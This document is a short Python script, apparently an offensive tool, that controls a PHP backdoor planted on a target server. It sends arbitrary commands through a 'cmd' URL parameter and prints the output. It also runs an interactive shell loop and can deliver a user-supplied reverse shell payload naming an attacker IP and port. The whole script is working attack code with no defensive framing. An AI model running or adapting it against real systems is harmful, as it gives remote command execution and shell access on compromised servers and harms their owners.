import argparse, time, requests, os
parser = argparse.ArgumentParser(description="Interactive Web Shell")
parser.add_argument("-t", "--target", help="Specify the target host --> http://10.10.10.10/uploads/backdoor.php", required=True)
parser.add_argument("-p", "--payload", help="Specify the reverse shell payload E.g. a python3 reverse shell. IP and Port required in the payload")
parser.add_argument("-o", "--option", help="Interactive Web Shell with loop usage: python3 interactive_shell.py -t http://10.10.10.10/uploads/backdoor.php -o yes")
args = parser.parse_args()
if args.target == None and args.payload == None:
    parser.print_help()
elif args.target and args.payload:
    print(requests.get(args.target+"/?cmd="+args.payload).text)
if args.target and args.option == "yes":
    os.system("clear")
    while True:
        try: # try statement
            cmd = input("$ ")
            print(requests.get(args.target+"/?cmd="+cmd).text)
            time.sleep(0.3)
        except requests.exceptions.InvalidSchema:
            print("Invalid URL Schema: http:// or https://")
        except requests.exceptions.ConnectionError:
            print("URL is invalid")
